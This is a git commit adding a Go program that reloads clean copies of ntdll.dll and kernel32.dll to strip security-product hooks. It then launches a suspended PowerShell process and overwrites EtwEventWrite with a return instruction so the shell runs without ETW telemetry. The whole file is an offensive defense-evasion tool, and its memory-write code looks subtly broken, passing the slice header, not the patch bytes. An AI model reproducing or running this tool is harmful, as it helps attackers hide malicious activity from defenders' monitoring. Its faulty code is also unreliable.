1a326a76252d6d267b9a8d2740afc6e0cd36b119
TimWhite <36320909+timwhitez@users.noreply.github.com>
2021-03-10 16:42:46 +0800

    Add files via upload

---
+++ main.go
@@ -0,0 +1,69 @@
+package main
+
+import (
+	"fmt"
+	"golang.org/x/sys/windows"
+	"log"
+	"syscall"
+	"unsafe"
+)
+
+var(
+	fntdll               = syscall.NewLazyDLL("ntdll.dll")
+	fucketw  = fntdll.NewProc("EtwEventWrite")
+
+	k32              = syscall.NewLazyDLL("kernel32.dll")
+	WriteProcessMemory  = k32.NewProc("WriteProcessMemory")
+)
+
+func init(){
+	err := RefreshPE(`c:\windows\system32\ntdll.dll`)
+	if err != nil {
+		log.Println("RefreshPE failed:", err)
+	}
+	err = RefreshPE(`c:\windows\system32\kernel32.dll`)
+	if err != nil {
+		log.Println("RefreshPE failed:", err)
+	}
+	fmt.Println("\nAll Dll Unhooked!\n")
+}
+
+
+func main(){
+	si := new(syscall.StartupInfo)
+	pi := new(syscall.ProcessInformation)
+
+	err2 := syscall.CreateProcess(nil, syscall.StringToUTF16Ptr("powershell -NoExit"), nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, si, pi)
+	if err2 != nil {
+		panic(err2)
+	}
+	fmt.Println(pi.ProcessId)
+	hProcess := uintptr(pi.Process)
+	hThread := uintptr(pi.Thread)
+
+	fmt.Println("patching .NET ETW ......")
+	var oldProtect uint32
+	var patch = []byte{0xc3}
+
+	e := windows.VirtualProtect(fucketw.Addr(), 1, syscall.PAGE_EXECUTE_READWRITE, &oldProtect)
+	if e != nil {
+		return
+	}
+
+	WriteProcessMemory.Call(hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch)), uintptr(len(patch)),0)
+
+
+
+	e = windows.VirtualProtect(fucketw.Addr(), 1, oldProtect, &oldProtect)
+	if e != nil {
+		return
+	}
+
+	fmt.Println("ETW patched!!\n")
+
+	windows.ResumeThread(windows.Handle(hThread))
+
+	windows.CloseHandle(windows.Handle(hProcess))
+	windows.CloseHandle(windows.Handle(hThread))
+	return
+}
